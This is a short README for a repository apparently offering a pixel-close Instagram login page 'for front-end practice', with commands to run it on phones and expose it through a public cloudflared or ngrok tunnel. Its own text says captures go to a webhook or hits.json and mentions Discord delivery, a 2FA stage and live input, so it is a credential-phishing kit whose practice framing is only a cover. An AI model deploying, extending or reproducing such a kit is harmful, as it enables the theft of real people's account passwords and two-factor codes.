# Login UI Lab

Pixel-close Instagram web login screen for front-end practice.

Works on **Termux** (Android) and **iSH** (iPhone).

## Quick start

```bash
# Termux
pkg install nodejs cloudflared
# iSH
apk add nodejs npm

git clone https://github.com/zenzemie/login-ui-lab.git
cd login-ui-lab
node server.js
```

Then tunnel for a public link:

```bash
cloudflared tunnel --url http://127.0.0.1:8080
# or ngrok http 8080
```

Open the printed HTTPS URL. Captures go to the configured webhook / hits.json.

See `SETUP.md` for full options (Discord, Worker, 2FA stage, live input).

Local only by default. Bind is `0.0.0.0` so tunnels work.
